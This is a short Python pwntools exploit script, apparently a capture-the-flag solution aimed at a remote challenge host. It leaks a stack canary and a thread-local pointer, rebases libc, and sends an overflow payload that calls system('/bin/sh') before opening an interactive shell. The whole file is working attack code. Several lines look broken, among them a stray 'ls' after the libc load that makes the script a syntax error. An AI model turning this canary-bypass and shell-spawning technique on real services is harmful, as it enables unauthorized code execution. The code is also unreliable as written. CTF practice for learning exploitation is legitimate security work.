from pwn import *

libc = ELF('./libc/libc.so.6')ls
r = remote('worker04.gcc-ctf.com', 12685)

def option(num):
    r.sendlineafter(b'> ', num)

def ask(payload):
    r.sendlineafter(b'> ', payload)
    r.recvline()
    r.recvline()
    return r.recvline()

# Leak canary
canary_offset = 72
option(b'1')
canary = u64(ask(b'A' * canary_offset).strip().ljust(8, b"\x00"))
canary *= 256
print("Canary is: ", hex(canary))

# Leak main thread tls info
offset = 1935
option(b'1')
leak = u64(ask(b'A' * offset).strip()[:8].ljust(8, b"\x00"))
print("Main thread leak: ", hex(leak))

# Rebase libc
libc.address = leak + 0x28C0
print("Libc address: ", hex(libc.address))

offset += 1
system = libc.sym[b'system'] << 17
payload = canary_offset * b'A' + p64(canary)
d = (offset - len(payload))
payload += (d//8) * p64(leak+0x90) + p64(leak) + p64(leak+0x9a0) + p64(leak) + 2 * p64(0x0) + p64(canary) + 12 * p64(0x0)
payload += p64(system) + p64(next(libc.search(b'/bin/sh')))

option(b'1')
ask(payload)

option(b'2')
#r.close()
r.interactive()
